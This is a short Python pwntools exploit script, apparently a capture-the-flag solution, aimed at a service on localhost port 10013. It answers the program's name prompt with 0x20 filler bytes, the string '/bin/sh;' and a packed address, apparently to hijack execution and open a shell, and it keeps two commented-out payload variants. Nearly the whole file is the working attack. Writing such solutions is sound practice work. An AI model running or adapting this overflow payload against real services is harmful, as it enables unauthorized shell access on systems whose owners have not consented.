#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('localhost', 10013)

input()
#r.sendlineafter("What's your name ?", b';'*0x28 + p64(0x8f7298))
r.sendlineafter(b"What's your name ?",b'A'*0x20 + b'/bin/sh;'  + p64(0x8f72a8))
#r.sendlineafter(b"What's your name ?",b'A'*0x20 + b'.bin/sh;' + b'\xff')
r.interactive()
